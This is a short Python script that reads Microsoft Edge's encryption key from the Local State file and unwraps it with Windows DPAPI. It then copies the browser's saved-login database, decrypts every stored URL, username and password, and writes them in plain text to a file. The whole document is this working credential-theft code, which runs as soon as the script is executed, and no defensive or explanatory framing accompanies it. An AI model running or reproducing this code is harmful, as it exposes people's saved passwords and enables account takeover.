import os
import json
import base64
import sqlite3
import shutil
import win32crypt
from Cryptodome.Cipher import AES

# Define Edge file paths
EDGE_PATH = os.path.expanduser(r"~\AppData\Local\Microsoft\Edge\User Data")
LOGIN_DB_PATH = os.path.join(EDGE_PATH, "Default", "Login Data")
LOCAL_STATE_PATH = os.path.join(EDGE_PATH, "Local State")
TEMP_DB_PATH = os.path.join(os.environ["TEMP"], "Edge_LoginData.db")

# Extract AES key from Local State
def get_aes_key():
    with open(LOCAL_STATE_PATH, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

# Decrypt AES-encrypted passwords
def decrypt_password(encrypted_password, aes_key):
    iv = encrypted_password[3:15]
    encrypted_data = encrypted_password[15:-16]
    cipher = AES.new(aes_key, AES.MODE_GCM, iv)
    return cipher.decrypt(encrypted_data).decode()

# Extract saved passwords
def extract_edge_passwords():
    shutil.copyfile(LOGIN_DB_PATH, TEMP_DB_PATH)  # Avoid file lock issues
    aes_key = get_aes_key()

    conn = sqlite3.connect(TEMP_DB_PATH)
    cursor = conn.cursor()

    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    with open("extracted_passwords.txt", "w") as file:
        for row in cursor.fetchall():
            url, username, encrypted_password = row
            decrypted_password = decrypt_password(encrypted_password, aes_key)
            file.write(f"URL: {url}\nUsername: {username}\nPassword: {decrypted_password}\n\n")

    conn.close()
    os.remove(TEMP_DB_PATH)

extract_edge_passwords()